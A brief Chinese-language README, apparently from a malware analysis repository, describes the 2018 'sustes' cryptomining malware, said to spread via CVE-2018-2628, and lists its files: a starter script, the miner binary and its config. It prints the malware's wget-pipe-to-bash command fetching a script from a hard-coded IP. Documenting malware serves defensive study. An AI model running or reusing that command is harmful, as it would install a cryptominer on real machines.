# sustes
2018.9 疑似利用CVE-2018-2628作为攻击手段
wget –q –O- http://192.99.142.226:8220/mr.sh | bash -sh

### mr.sh:
开始执行的主要脚本

### xm64:
恶意挖矿本体

### wt.conf
恶意挖矿配置信息